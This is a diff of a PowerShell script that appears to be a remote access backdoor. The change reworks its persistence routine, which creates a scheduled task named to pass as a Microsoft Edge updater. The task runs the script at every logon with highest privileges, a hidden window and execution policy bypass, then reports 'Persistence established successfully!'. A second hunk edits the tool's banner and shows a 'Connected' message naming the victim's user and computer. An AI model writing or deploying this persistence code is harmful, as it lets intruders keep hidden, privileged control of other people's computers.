@@ -364,16 +364,12 @@ function PortSuggest {
 
         $taskName = "MicrosoftEdgeUpdateChecker"
 
-        # Проверка: если задача уже существует, удаляем её
-        $existingTask = schtasks /Query /TN $taskName 2>$null
-        if ($LASTEXITCODE -eq 0) {
-            schtasks /Delete /TN $taskName /F | Out-Null
+        schtasks /Query /TN $taskName 2>$null
+        if ($LASTEXITCODE -ne 0) {
+            schtasks /Create /TN $taskName /SC ONLOGON `
+                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
+                /RL HIGHEST /F | Out-Null
         }
-
-        # Создаём новую задачу
-        schtasks /Create /TN $taskName /SC ONLOGON `
-            /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
-            /RL HIGHEST /F | Out-Null
 
         return "[+] Persistence established successfully!"
     }
@@ -641,7 +637,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
-                BAT
+                BALLS
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
